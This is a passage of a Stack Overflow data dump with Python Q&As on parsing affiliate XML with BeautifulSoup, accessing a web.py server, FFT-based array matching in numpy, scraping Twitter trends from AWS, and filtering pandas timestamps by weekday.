&lt;/blacklist_type&gt;\n            &lt;date_created&gt;2018-04-26T00:00:00&lt;/date_created&gt;\n          &lt;/blacklist&gt;\n        &lt;/blacklists&gt;\n        &lt;date_created&gt;2018-01-29T11:40:58.34&lt;/date_created&gt;\n        &lt;notes /&gt;\n      &lt;/affiliate&gt;\n    &lt;/affiliates&gt;\n  &lt;/affiliate_export_response&gt;\n</code></pre>\n\n<p>Use this to get the creation date of an affiliate only </p>\n\n<pre><code>from bs4 import BeautifulSoup\nsoup = BeautifulSoup(text, 'html.parser')\nfor affiliate in soup.select('affiliate &gt; date_created'):\n     parent = affiliate.parent\n     print(affiliate.text)\n</code></pre>\n\n<p><strong>Demo :</strong> <a href=\"https://repl.it/repls/YoungBlankSigns\" rel=\"nofollow noreferrer\">Here</a></p>\n"}, {"tags": [], "owner": {"reputation": 71123, "user_id": 6241235, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/dCxzx.png?s=128&g=1", "display_name": "QHarr", "link": "https://stackoverflow.com/users/6241235/qharr"}, "is_accepted": false, "score": 0, "last_activity_date": 1571882513, "creation_date": 1571882513, "answer_id": 58533126, "question_id": 58532173, "link": "https://stackoverflow.com/questions/58532173/how-to-grab-first-child-of-its-kind/58533126#58533126", "title": "How to grab first child of its kind", "body": "<p>In this particular example with bs4 4.7.1+ you can use nth-child(even) in your loop over affiliate nodes.</p>\n\n<pre><code>import requests\nfrom bs4 import BeautifulSoup as bs\n\nhtml = '''\n&lt;affiliate_export_response&gt;\n    &lt;success&gt;true&lt;/success&gt;\n    &lt;row_count&gt;1&lt;/row_count&gt;\n    &lt;affiliates&gt;\n        &lt;affiliate&gt;\n        &lt;blacklists&gt;\n          &lt;blacklist&gt;\n            &lt;advertiser&gt;\n              &lt;advertiser_id xmlns=\"API:id_name_store\"&gt;2&lt;/advertiser_id&gt;\n              &lt;advertiser_name xmlns=\"API:id_name_store\"&gt;wayne's Ad&lt;/advertiser_name&gt;\n            &lt;/advertiser&gt;\n            &lt;affiliate&gt;\n              &lt;affiliate_id xmlns=\"API:id_name_store\"&gt;3&lt;/affiliate_id&gt;\n              &lt;affiliate_name xmlns=\"API:id_name_store\"&gt;Mark Affiliate&lt;/affiliate_name&gt;\n            &lt;/affiliate&gt;\n            &lt;blacklist_reason&gt;\n              &lt;blacklist_reason_id xmlns=\"API:id_name_store\"&gt;1&lt;/blacklist_reason_id&gt;\n              &lt;blacklist_reason_name xmlns=\"API:id_name_store\"&gt;404&lt;/blacklist_reason_name&gt;\n            &lt;/blacklist_reason&gt;\n            &lt;blacklist_type&gt;\n              &lt;blacklist_type_id xmlns=\"API:id_name_store\"&gt;3&lt;/blacklist_type_id&gt;\n              &lt;blacklist_type_name xmlns=\"API:id_name_store\"&gt;404&lt;/blacklist_type_name&gt;\n            &lt;/blacklist_type&gt;\n            &lt;date_created&gt;2018-04-26T00:00:00&lt;/date_created&gt;\n          &lt;/blacklist&gt;\n        &lt;/blacklists&gt;\n        &lt;date_created&gt;2018-01-29T11:40:58.34&lt;/date_created&gt;\n        &lt;notes /&gt;\n      &lt;/affiliate&gt;\n    &lt;/affiliates&gt;\n  &lt;/affiliate_export_response&gt;\n'''\nsoup = bs(html, 'lxml')\nfor item in soup.select('affiliate'):\n    date = item.select_one('date_created:nth-child(even)')\n    if date is None:\n        print('N/A')\n    else:\n        print(date.text)\n</code></pre>\n"}], "owner": {"reputation": 253, "user_id": 11315276, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-XkLMzK4iuQU/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rcRrUcmcIQTrBC7D5InZPbJr_1mjA/mo/photo.jpg?sz=128", "display_name": "ApacheOne", "link": "https://stackoverflow.com/users/11315276/apacheone"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 41, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1571882513, "creation_date": 1571873134, "last_edit_date": 1571873775, "question_id": 58532173, "link": "https://stackoverflow.com/questions/58532173/how-to-grab-first-child-of-its-kind", "title": "How to grab first child of its kind", "body": "<p>I am trying to capture data from two nodes that have the same name. I am using the find method but it always pulls the value that is nested as opposed to the first child node. I've tried a few different methods to target but I am not having any success. Any help is appreciated as always.</p>\n\n<pre><code>API Response:\n\n\n&lt;affiliate_export_response&gt;\n  &lt;success&gt;true&lt;/success&gt;\n  &lt;row_count&gt;1&lt;/row_count&gt;\n  &lt;affiliates&gt;\n      &lt;blacklists&gt;\n        &lt;blacklist&gt;\n          &lt;advertiser&gt;\n            &lt;advertiser_id xmlns=\"API:id_name_store\"&gt;2&lt;/advertiser_id&gt;\n            &lt;advertiser_name xmlns=\"API:id_name_store\"&gt;wayne's Ad&lt;/advertiser_name&gt;\n          &lt;/advertiser&gt;\n          &lt;affiliate&gt;\n            &lt;affiliate_id xmlns=\"API:id_name_store\"&gt;3&lt;/affiliate_id&gt;\n            &lt;affiliate_name xmlns=\"API:id_name_store\"&gt;Mark Affiliate&lt;/affiliate_name&gt;\n          &lt;/affiliate&gt;\n          &lt;blacklist_reason&gt;\n            &lt;blacklist_reason_id xmlns=\"API:id_name_store\"&gt;1&lt;/blacklist_reason_id&gt;\n            &lt;blacklist_reason_name xmlns=\"API:id_name_store\"&gt;404&lt;/blacklist_reason_name&gt;\n          &lt;/blacklist_reason&gt;\n          &lt;blacklist_type&gt;\n            &lt;blacklist_type_id xmlns=\"API:id_name_store\"&gt;3&lt;/blacklist_type_id&gt;\n            &lt;blacklist_type_name xmlns=\"API:id_name_store\"&gt;404&lt;/blacklist_type_name&gt;\n          &lt;/blacklist_type&gt;\n          &lt;date_created&gt;2018-04-26T00:00:00&lt;/date_created&gt;\n        &lt;/blacklist&gt;\n      &lt;/blacklists&gt;\n      &lt;date_created&gt;2018-01-29T11:40:58.34&lt;/date_created&gt;\n      &lt;notes /&gt;\n    &lt;/affiliate&gt;\n  &lt;/affiliates&gt;\n&lt;/affiliate_export_response&gt;\n\nCode:\n\nimport requests\nfrom bs4 import BeautifulSoup\n\nurl = 'API URL'\nparams = {\n          'param1':'dfasdf',\n          'param2':3\n          }\nr = requests.get(url, params=params)\nsoup = BeautifulSoup(r.text, 'lxml')\nfor affiliate in soup.select('affiliate'):\n     date_created = affiliate.find('date_created').string\n     print(date_created)\n</code></pre>\n\n<p>The goal is to capture 2018-01-29T11:40:58.34 but I am capturing the nested date_created node inside blacklists and getting 2018-04-26T00:00:00 instead.</p>\n"}, {"tags": ["python", "web.py"], "answers": [{"tags": [], "owner": {"reputation": 144, "user_id": 7853356, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-sZRF2ug_f-c/AAAAAAAAAAI/AAAAAAAAAMw/kf1N4MJ1qzg/photo.jpg?sz=128", "display_name": "SamHDev", "link": "https://stackoverflow.com/users/7853356/samhdev"}, "is_accepted": true, "score": 2, "last_activity_date": 1571873241, "creation_date": 1571873241, "answer_id": 58532184, "question_id": 58532143, "link": "https://stackoverflow.com/questions/58532143/accessing-web-py-web-server/58532184#58532184", "title": "Accessing web.py web server", "body": "<p>You can goto:</p>\n\n<p><code>http://localhost:8080</code> in your web-browser!</p>\n\n<p>Simply <code>0.0.0.0</code> means open to all incoming 'host's' whereas, you want to connect to your localhost</p>\n"}], "owner": {"reputation": 151, "user_id": 8105367, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-ALtu4kramFs/AAAAAAAAAAI/AAAAAAAAABM/UL64PmGeL5E/photo.jpg?sz=128", "display_name": "dumbitdownjr", "link": "https://stackoverflow.com/users/8105367/dumbitdownjr"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 207, "favorite_count": 0, "accepted_answer_id": 58532184, "answer_count": 1, "score": 1, "last_activity_date": 1571873241, "creation_date": 1571872856, "question_id": 58532143, "link": "https://stackoverflow.com/questions/58532143/accessing-web-py-web-server", "title": "Accessing web.py web server", "body": "<p>I'm trying to run <a href=\"http://webpy.org/docs/0.3/tutorial\" rel=\"nofollow noreferrer\">the tutorial code</a> for web.py, and everything works fine except when I try to access the web server using a browser it says it can't connect to the server.\nHere is the code:</p>\n\n<pre><code>import web\n\nurls = (\n    '/', 'index'\n)\n\nclass index:\n    def GET(self):\n        return \"Hello, world!\"\n\nif __name__ == \"__main__\":\n    app = web.application(urls, globals())\n    app.run()\n</code></pre>\n\n<p>I run it like this:</p>\n\n<pre><code>$ python code.py\nhttp://0.0.0.0:8080/\n</code></pre>\n\n<p>As far as I can tell, this is exactly what the tutorial says to do, but like I say when I try to access the web server it gives me an error. For example, when I copy the address into firefox it gives me this error:</p>\n\n<p><code>Firefox can\u2019t establish a connection to the server at 0.0.0.0:8080.</code></p>\n\n<p>Any ideas of what I've done wrong?</p>\n"}, {"tags": ["python", "numpy", "python-3.4"], "comments": [{"owner": {"reputation": 74843, "user_id": 2988730, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/ZOX7t.jpg?s=128&g=1", "display_name": "Mad Physicist", "link": "https://stackoverflow.com/users/2988730/mad-physicist"}, "edited": false, "score": 0, "creation_date": 1571874307, "post_id": 58532123, "comment_id": 103388202, "body": "Look into normalized cross-correlation, and convolution"}, {"owner": {"reputation": 43423, "user_id": 1011724, "user_type": "registered", "accept_rate": 99, "profile_image": "https://i.stack.imgur.com/2JAXi.jpg?s=128&g=1", "display_name": "Dan", "link": "https://stackoverflow.com/users/1011724/dan"}, "edited": false, "score": 1, "creation_date": 1571874684, "post_id": 58532123, "comment_id": 103388273, "body": "What do you mean by &quot;closest&quot;? What is the intended purpose of finding this matching portion. What is in the arrays? ints, float? spare or dense? are the values bound to a range?"}, {"owner": {"reputation": 13, "user_id": 6022784, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-0RRC2KpboHY/AAAAAAAAAAI/AAAAAAAACeA/SIwVfWGTgMA/photo.jpg?sz=128", "display_name": "Greg D", "link": "https://stackoverflow.com/users/6022784/greg-d"}, "edited": false, "score": 0, "creation_date": 1571875028, "post_id": 58532123, "comment_id": 103388328, "body": "Im looking for an element by comparison. The array is integers coming from an image"}, {"owner": {"reputation": 13, "user_id": 6022784, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-0RRC2KpboHY/AAAAAAAAAAI/AAAAAAAACeA/SIwVfWGTgMA/photo.jpg?sz=128", "display_name": "Greg D", "link": "https://stackoverflow.com/users/6022784/greg-d"}, "reply_to_user": {"reputation": 74843, "user_id": 2988730, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/ZOX7t.jpg?s=128&g=1", "display_name": "Mad Physicist", "link": "https://stackoverflow.com/users/2988730/mad-physicist"}, "edited": false, "score": 0, "creation_date": 1571875340, "post_id": 58532123, "comment_id": 103388390, "body": "@MadPhysicist I have been trying that. A problem Im having is that if the smaller array is all 0s, convolution returns nothing"}, {"owner": {"reputation": 18268, "user_id": 5218354, "user_type": "registered", "accept_rate": 57, "profile_image": "https://lh4.googleusercontent.com/-NEO9rZKeffY/AAAAAAAAAAI/AAAAAAAAAKc/9IttO1jUOr4/photo.jpg=k-s128", "display_name": "norok2", "link": "https://stackoverflow.com/users/5218354/norok2"}, "edited": false, "score": 0, "creation_date": 1571875543, "post_id": 58532123, "comment_id": 103388420, "body": "Isn&#39;t this substantially image registration (using only translation)?"}, {"owner": {"reputation": 13, "user_id": 6022784, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-0RRC2KpboHY/AAAAAAAAAAI/AAAAAAAACeA/SIwVfWGTgMA/photo.jpg?sz=128", "display_name": "Greg D", "link": "https://stackoverflow.com/users/6022784/greg-d"}, "reply_to_user": {"reputation": 18268, "user_id": 5218354, "user_type": "registered", "accept_rate": 57, "profile_image": "https://lh4.googleusercontent.com/-NEO9rZKeffY/AAAAAAAAAAI/AAAAAAAAAKc/9IttO1jUOr4/photo.jpg=k-s128", "display_name": "norok2", "link": "https://stackoverflow.com/users/5218354/norok2"}, "edited": false, "score": 0, "creation_date": 1571876977, "post_id": 58532123, "comment_id": 103388649, "body": "@norok2 It does look like that would solve the problem. I could find a way to do it in just numpy, do have an example?"}, {"owner": {"reputation": 18268, "user_id": 5218354, "user_type": "registered", "accept_rate": 57, "profile_image": "https://lh4.googleusercontent.com/-NEO9rZKeffY/AAAAAAAAAAI/AAAAAAAAAKc/9IttO1jUOr4/photo.jpg=k-s128", "display_name": "norok2", "link": "https://stackoverflow.com/users/5218354/norok2"}, "edited": false, "score": 0, "creation_date": 1571877354, "post_id": 58532123, "comment_id": 103388719, "body": "A crude and slow way would be using two nested loops as you are doing. You just need to polish it a bit (e.g. making sure that you compute the distance between <code>array1</code> and the <code>(i,j)</code>-based view of <code>array2</code> with matching size, storing/updating the minimum every time a new one is found. I do not have already written code for this. Note that if your distance involves element-wise multiplication and one of your inputs is all <code>0</code>s, your distance may be <code>0</code> independently of the position, i.e. every location is the <i>best</i> (equally worse?) location."}], "answers": [{"comments": [{"owner": {"reputation": 13, "user_id": 6022784, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-0RRC2KpboHY/AAAAAAAAAAI/AAAAAAAACeA/SIwVfWGTgMA/photo.jpg?sz=128", "display_name": "Greg D", "link": "https://stackoverflow.com/users/6022784/greg-d"}, "edited": false, "score": 0, "creation_date": 1571889380, "post_id": 58533093, "comment_id": 103390879, "body": "Thank you! This solution precisely what I was looking for. From my quick tests, it&#39;s about 150% faster than my solution. I thought fft could work, but I couldn&#39;t put all the pieces together. I will study this code for the future."}], "tags": [], "owner": {"reputation": 47088, "user_id": 7207392, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/dadc9567dde5f02b09a29695eca1ce40?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Panzer", "link": "https://stackoverflow.com/users/7207392/paul-panzer"}, "is_accepted": true, "score": 1, "last_activity_date": 1571885345, "last_edit_date": 1571885345, "creation_date": 1571882232, "answer_id": 58533093, "question_id": 58532123, "link": "https://stackoverflow.com/questions/58532123/find-location-where-smaller-array-matches-larger-array-the-most/58533093#58533093", "title": "Find location where smaller array matches larger array the most", "body": "<p>Here is an FFT/convolution based approach that minimizes Euclidean distance:</p>\n\n<pre><code>import numpy as np\nfrom numpy import fft\n\nN = 184\nn = 46\npad = 192\n\ndef best_offs(A,a):\n    A,a = A.astype(float),a.astype(float)\n    Ap,ap = (np.zeros((pad,pad)) for _ in \"Aa\")\n    Ap[:N,:N] = A\n    ap[:n,:n] = a\n    sim = fft.irfft2(fft.rfft2(ap).conj()*fft.rfft2(Ap))[:N-n+1,:N-n+1]\n    Ap[:N,:N] = A*A\n    ap[:n,:n] = 1\n    ref = fft.irfft2(fft.rfft2(ap).conj()*fft.rfft2(Ap))[:N-n+1,:N-n+1]\n    return np.unravel_index((ref-2*sim).argmin(),sim.shape)\n\n# example\n# random picture\nA = np.random.randint(0,256,(N,N),dtype=np.uint8)\n# random offset\noffy,offx = np.random.randint(0,N-n+1,2)\n# sub pic at random offset\n# randomly flip half of the least significant 75% of all bits\na = A[offy:offy+n,offx:offx+n] ^ np.random.randint(0,64,(n,n))\n\n# reconstruct offset\noyrec,oxrec = best_offs(A,a)\nassert offy==oyrec and offx==oxrec\n\n# speed?\nfrom timeit import timeit\nprint(timeit(lambda:best_offs(A,a),number=100)*10,\"ms\")\n\n# example with zero a\na[...] = 0\n# make A smaller in a matching subsquare\nA[offy:offy+n,offx:offx+n]&gt;&gt;=1\n\n# reconstruct offset\noyrec,oxrec = best_offs(A,a)\nassert offy==oyrec and offx==oxrec\n</code></pre>\n\n<p>Sample run:</p>\n\n<pre><code>3.458537160186097 ms\n</code></pre>\n"}], "owner": {"reputation": 13, "user_id": 6022784, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-0RRC2KpboHY/AAAAAAAAAAI/AAAAAAAACeA/SIwVfWGTgMA/photo.jpg?sz=128", "display_name": "Greg D", "link": "https://stackoverflow.com/users/6022784/greg-d"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 84, "favorite_count": 0, "accepted_answer_id": 58533093, "answer_count": 1, "score": 1, "last_activity_date": 1571885345, "creation_date": 1571872621, "last_edit_date": 1571875136, "question_id": 58532123, "link": "https://stackoverflow.com/questions/58532123/find-location-where-smaller-array-matches-larger-array-the-most", "title": "Find location where smaller array matches larger array the most", "body": "<p>I need to find where a smaller 2d array, array1 matches the closest inside another 2d array, array2.</p>\n\n<ul>\n<li><p>array1 with have the size of grid_size 46x46 to 96x96. </p></li>\n<li><p>array2 will be larger (184x184).</p></li>\n</ul>\n\n<p>I only have access to numpy.</p>\n\n<p>I am currently trying to use the <a href=\"https://docs.eyesopen.com/toolkits/python/graphsimtk/measure.html#tversky\" rel=\"nofollow noreferrer\">Tversky formula</a> but am not tied to it.</p>\n\n<p>Efficiency is the most important part as this will run many times. My current solution shown below is very slow.</p>\n\n<pre><code>for i in range(array2.shape[0] - grid_size):\n    for j in range(array2.shape[1] - grid_size):\n        r[i, j] = np.sum(array2[i:i+grid_size, j:j+grid_size] == array1 ) / (np.sum(array2[i:i+grid_size, j:j+grid_size] != array1 ) + np.sum(Si[i:i+grid_size, j:j+grid_size] == array1 ))\n</code></pre>\n\n<p>Edit:\nThe goal is to find the location where a smaller image matches another image.</p>\n"}, {"tags": ["python", "amazon-ec2", "web-scraping", "twitter", "python-requests"], "comments": [{"owner": {"reputation": 561, "user_id": 11774808, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-L8EsrcMm6gk/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3reXQ5uPp5l81opQZN79bkr1OJizoQ/photo.jpg?sz=128", "display_name": "m01010011", "link": "https://stackoverflow.com/users/11774808/m01010011"}, "edited": false, "score": 0, "creation_date": 1571931284, "post_id": 58532112, "comment_id": 103410698, "body": "What are you using on your local machine? If it&#39;s windows, then you probably copied Windows-specific <code>User Agent</code> in the headers. Try using Linux-specific <code>User-Agent</code> string on the EC2 instance. You can get one from a quick Google search, or you can try installing <code>lynx</code> command line browser and see the headers it generates."}, {"owner": {"reputation": 78, "user_id": 4788695, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/P9mHU.jpg?s=128&g=1", "display_name": "Lalo", "link": "https://stackoverflow.com/users/4788695/lalo"}, "reply_to_user": {"reputation": 561, "user_id": 11774808, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-L8EsrcMm6gk/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3reXQ5uPp5l81opQZN79bkr1OJizoQ/photo.jpg?sz=128", "display_name": "m01010011", "link": "https://stackoverflow.com/users/11774808/m01010011"}, "edited": false, "score": 0, "creation_date": 1572022643, "post_id": 58532112, "comment_id": 103444306, "body": "Thanks for the comment. I use linux. I tried using the <code>User-Agent</code> from my web browser and it didn&#39;t work. I tried <code>Lynx</code> on the Server as well, didn&#39;t work either."}], "answers": [{"tags": [], "owner": {"reputation": 26, "user_id": 11098639, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-DGuTxYhklBs/AAAAAAAAAAI/AAAAAAAAF8U/X5U6gdL2a-4/photo.jpg?sz=128", "display_name": "Karan Mittal", "link": "https://stackoverflow.com/users/11098639/karan-mittal"}, "is_accepted": true, "score": 1, "last_activity_date": 1617252155, "creation_date": 1617252155, "answer_id": 66898532, "question_id": 58532112, "link": "https://stackoverflow.com/questions/58532112/unable-to-get-the-same-requests-results-from-twitter-web-from-my-local-pc-and-aw/66898532#66898532", "title": "Unable to get the same requests results from Twitter Web from my local PC and AWS EC2 instance", "body": "<p>The main reason it doesn't work because Twitter blocks AWS EC2 instance IPs. It's not a server problem but a block improvised by Twitter itself. I searched a lot and found the same problems with various libraries used for twitter scraping.</p>\n<p>I would recommend using proxies in this case or can change the provider to Linode or digital ocean. I also checked Heroku and turns out its IPs are also blocked after some requests.</p>\n<p>Usage of proxies is well-explained in this link of docs from <a href=\"https://2.python-requests.org/en/v2.9.1/user/advanced/\" rel=\"nofollow noreferrer\">request-docs</a>.</p>\n<p>As from your code, the solution should be</p>\n<pre><code>\nimport requests\nfrom bs4 import BeautifulSoup\n\nproxies = [\n  &quot;http&quot;: &quot;http://10.10.1.10:3128&quot;,\n  &quot;https&quot;: &quot;http://10.10.1.10:1080&quot;,\n  &quot;http&quot;: &quot;your proxy server&quot;\n]\n\nurl = 'http://twitter.com/i/trends'\nr = requests.get(url, proxies=proxies)\nhtml = r.json()['module_html']\nsoup = BeautifulSoup(html, 'html.parser')\ntrends_list = soup.find_all('span', {'class':'u-linkComplex-target trend-name'})\ntweet_volume_list = soup.findAll('div', {'class':'js-nav trend-item-stats js-ellipsis'})\n\n</code></pre>\n<p>You should also try some of the free proxy servers and python also has libraries like <a href=\"https://pypi.org/project/free-proxy/\" rel=\"nofollow noreferrer\"><code>free-proxy</code></a> that might be of help.\nEven then I would recommend if the data volume is large then you should consider using multiple proxies and rotate them frequently and also try using async requests library like <a href=\"https://docs.aiohttp.org/en/stable/\" rel=\"nofollow noreferrer\"><code>aiohttp</code></a>.</p>\n"}], "owner": {"reputation": 78, "user_id": 4788695, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/P9mHU.jpg?s=128&g=1", "display_name": "Lalo", "link": "https://stackoverflow.com/users/4788695/lalo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 82, "favorite_count": 0, "accepted_answer_id": 66898532, "answer_count": 1, "score": 0, "last_activity_date": 1617252155, "creation_date": 1571872564, "last_edit_date": 1592644375, "question_id": 58532112, "link": "https://stackoverflow.com/questions/58532112/unable-to-get-the-same-requests-results-from-twitter-web-from-my-local-pc-and-aw", "title": "Unable to get the same requests results from Twitter Web from my local PC and AWS EC2 instance", "body": "<p>I want to be able to Scrape Twitter's Trending Topics.</p>\n<p>Of course, the natural way to do that, is to use the Twitter API. However, most of the Trends do not come with a <em>Tweet_count</em>, which is key for me.</p>\n<p>So I decided to scrape the Twitter website, and it has been a mess.</p>\n<p>First, I just went after <a href=\"https://twitter.com/i/trends\" rel=\"nofollow noreferrer\">https://twitter.com/i/trends</a> and it worked fine and still does, on my local computer. Then I tried to set up the script on my AWS EC2 instance, yet I got no results.\nThis is a simplified version of the code:</p>\n<pre><code>import requests\nfrom bs4 import BeautifulSoup\n\n\nurl = 'http://twitter.com/i/trends'\nr = requests.get(url)\nhtml = r.json()['module_html']\nsoup = BeautifulSoup(html, 'html.parser')\ntrends_list = soup.find_all('span', {'class':'u-linkComplex-target trend-name'})\ntweet_volume_list = soup.findAll('div', {'class':'js-nav trend-item-stats js-ellipsis'})\n</code></pre>\n<p>and like I said, it worked fine. However, if I run this same code on my Linux server in AWS, the result of <code>r.content</code> is <code>'{}'</code>.</p>\n<p>So then I tried going with <code>mobile.twitter.com/i/trends</code> and got a similar problem. I did find with the DevTools on a Private Session that twitter goes to an <code>https://api.twitter.com/2/guide.json</code> endpoint internally, and that is the actual resource that returns the data I'm looking for (trends and tweet volume). However, no matter what I did, with <code>requests</code>, I was unable to access it with <code>python</code>. I tried using the same <code>headers</code> and the same <code>params</code> as the browser, but to no avail.</p>\n<p>So then I move to selenium, and just like before, I did get data locally, but not the actual TT data on the server. So at this point I'm pretty lost. I don't know enough web dev to understand exactly if this is a cookie problem or what, nor how to fix it.</p>\n<p><strong>TL;DR</strong>: I want to scrape Twitter's Trending Topics with python but it's not working.</p>\n"}, {"tags": ["python", "pandas"], "answers": [{"comments": [{"owner": {"reputation": 462, "user_id": 12081954, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/a-/AAuE7mCny9pyWN5BhoN3035PNaRoL0JGqksQg8yvRcP-kQ=k-s128", "display_name": "mayosten", "link": "https://stackoverflow.com/users/12081954/mayosten"}, "edited": false, "score": 0, "creation_date": 1571875842, "post_id": 58532429, "comment_id": 103388465, "body": "Got the Tues/Fri times reversed, but same difference."}], "tags": [], "owner": {"reputation": 462, "user_id": 12081954, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/a-/AAuE7mCny9pyWN5BhoN3035PNaRoL0JGqksQg8yvRcP-kQ=k-s128", "display_name": "mayosten", "link": "https://stackoverflow.com/users/12081954/mayosten"}, "is_accepted": false, "score": 0, "last_activity_date": 1571875483, "creation_date": 1571875483, "answer_id": 58532429, "question_id": 58532111, "link": "https://stackoverflow.com/questions/58532111/better-selection-from-pandas-datatimeindex-by-weekday-and-time/58532429#58532429", "title": "Better selection from Pandas DatatimeIndex by weekday and time", "body": "<p>It seems like you could use the internal index functionality in <code>pandas</code> to index this a little more cleanly. I'm avoiding the conversion to fractional time, and admittedly what I'm doing only works for whole hours. The basic difference is using pandas built-in functionality and avoiding <code>calendars</code> as an import. Here's what I've done that is mostly equivalent to your very specific example of Tues-Fri, but if you only need intervals on the hour, you could adapt this to the more general case.</p>\n\n<pre class=\"lang-py prettyprint-override\"><code>import pandas as pd\n\nidx = pd.date_range('2019-01-01', '2019-01-31', freq='H')\ndf = pd.DataFrame(index=idx)\n\n# Build a series of filters for each part of your weekly interval.\ntues = (df.index.weekday == 1) &amp; (df.index.hour &gt;= 6)\nweds_thurs = df.index.weekday.isin([2,3])\nfri = (df.index.weekday == 4) &amp; (df.index.hour &lt;= 20)\n\n# The mask is just the union of all those conditions\nmask = tues | weds_thurs | fri\n\n# now apply the mask and the rest is basically what you were doing\ndf = df.loc[mask]\ndf['Date'] = df.index.date\ndf['Weekday'] = df.index.weekday\ndf['WeekdayName'] = df.index.weekday_name\ndf['Hour'] = df.index.hour\ndf.pivot_table(index=['Date', 'WeekdayName'], columns='Hour', values='Weekday', aggfunc='count')\n</code></pre>\n\n<p>Now I see output that looks like this:\n<a href=\"https://i.stack.imgur.com/wrx4M.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/wrx4M.png\" alt=\"enter image description here\"></a></p>\n"}, {"tags": [], "owner": {"reputation": 3891, "user_id": 4585713, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0163e6ba41d9dfd2c9d13c528c87e1f5?s=128&d=identicon&r=PG&f=1", "display_name": "PMende", "link": "https://stackoverflow.com/users/4585713/pmende"}, "is_accepted": false, "score": 0, "last_activity_date": 1571876930, "creation_date": 1571876930, "answer_id": 58532571, "question_id": 58532111, "link": "https://stackoverflow.com/questions/58532111/better-selection-from-pandas-datatimeindex-by-weekday-and-time/58532571#58532571", "title": "Better selection from Pandas DatatimeIndex by weekday and time", "body": "<p>The following should achieve what you're looking for:</p>\n\n<pre class=\"lang-py prettyprint-override\"><code>def make_date_mask(day_start, time_start, day_end, time_end, series):\n    flipped = False\n    if day_start &gt; day_end:\n        # Need to flip the ordering, then negate at the end\n        day_start, time_start, day_end, time_end = (\n            day_end, time_end, day_start, time_start\n        )\n        flipped = True\n\n    time_start = datetime.strptime(time_start, \"%H:%M:%S\").time()\n    time_end = datetime.strptime(time_end, \"%H:%M:%S\").time()\n\n    # Get everything for the specified days, inclusive\n    mask = series.dt.dayofweek.between(day_start, day_end)\n    # Filter things that happen before the begining of the start time\n    # of the start day\n    mask = mask &amp; ~(\n        (series.dt.dayofweek == day_start) \n        &amp; (series.dt.time &lt; time_start)\n    )\n    # Filter things that happen after the ending time of the end day\n    mask = mask &amp; ~(\n        (series.dt.dayofweek == day_end) \n        &amp; (series.dt.time &gt; time_end)\n    )\n\n    if flipped:\n        # Negate the mask to get the actual result and add in the\n        # times that were exactly on the boundaries, just in case\n        mask = ~mask | (\n            (series.dt.dayofweek == day_start) \n            &amp; (series.dt.time == time_start)\n        ) | (\n            (series.dt.dayofweek == day_end) \n            &amp; (series.dt.time == time_end)\n        )\n    return mask\n</code></pre>\n\n<p>Using it with your example:</p>\n\n<pre><code>import pandas as pd\n\ndf = pd.DataFrame({\n    \"dates\": pd.date_range('2019-01-01', '2019-01-31', freq='H')\n})\nfiltered_df = df[make_date_mask(6, \"23:00:00\", 0, \"00:30:00\", df[\"dates\"])]\n</code></pre>\n\n<p><code>filtered</code> looks like:</p>\n\n<pre><code>                  dates\n143 2019-01-06 23:00:00\n144 2019-01-07 00:00:00\n311 2019-01-13 23:00:00\n312 2019-01-14 00:00:00\n479 2019-01-20 23:00:00\n480 2019-01-21 00:00:00\n647 2019-01-27 23:00:00\n648 2019-01-28 00:00:00\n</code></pre>\n"}], "owner": {"reputation": 155, "user_id": 1334690, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/54f0064437433c337707e231802bac7c?s=128&d=identicon&r=PG", "display_name": "Powerfool", "link": "https://stackoverflow.com/users/1334690/powerfool"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 131, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1571876930, "creation_date": 1571872555, "question_id": 58532111, "link": "https://stackoverflow.com/questions/58532111/better-selection-from-pandas-datatimeindex-by-weekday-and-time", "title": "Better selection from Pandas DatatimeIndex by weekday and time", "body": "<p>Problem: Selection from Pandas <code>DatetimeIndex</code> by weekday and time. For example, I would like to select all items between Tuesday 20:00 and Friday 06:00.</p>\n\n<p>Question: Is there a better solution than my solution below?</p>\n\n<p>I have an existing solution (see below), but I don't like it too much for the following reasons:</p>\n\n<ul>\n<li>It converts the timestamps to floats and does float comparisons, with the usual accuracy issues.</li>\n<li>It does neither seem very elegant nor pythonic to convert from a rich datatype to a primitive datatype with a contrived mapping for the task at hand.</li>\n<li>Selections across Sunday (weekday 6) - Monday (weekday 0) require klugdy special treatment (not part of example below).</li>\n</ul>\n\n<p>My working example:</p>\n\n<pre class=\"lang-py prettyprint-override\"><code>import pandas as pd\nfrom datetime import time\nimport 